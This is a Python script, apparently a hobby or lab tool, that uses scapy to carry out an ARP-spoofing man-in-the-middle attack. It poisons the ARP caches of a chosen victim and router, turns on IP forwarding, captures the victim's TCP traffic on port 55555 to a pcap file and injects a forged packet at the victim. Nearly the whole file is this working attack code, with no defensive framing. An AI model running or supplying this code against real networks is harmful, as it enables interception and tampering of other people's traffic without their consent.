import os
import sys
import socket
from scapy.all import*
import forge

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def Spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def Restore(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def sniffer(interface, routerIP, victimIP, eve):
    pkts = sniff(count = 10, filter="tcp and dst port 55555" ,prn=lambda pkt: "%s: %s" % (pkt.sniffed_on, pkt.show()))
    wrpcap("temp.pcap", pkts)
    badPacket = IP(dst=victimIP, flags=2)/TCP(dport=55555)/"restart connection"
    send(badPacket, iface=None)

def MiddleMan():
    eve = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interface = input("interface: \n") #wlp3s0
    victimIP = input("victim: \n") #192.168.1.214
    routerIP= input("router: \n") #192.168.1.0
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            Spoof(routerIP, victimIP)
            #time.sleep(1)
            sniffer(interface, routerIP, victimIP, eve)
            print('never escape')
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()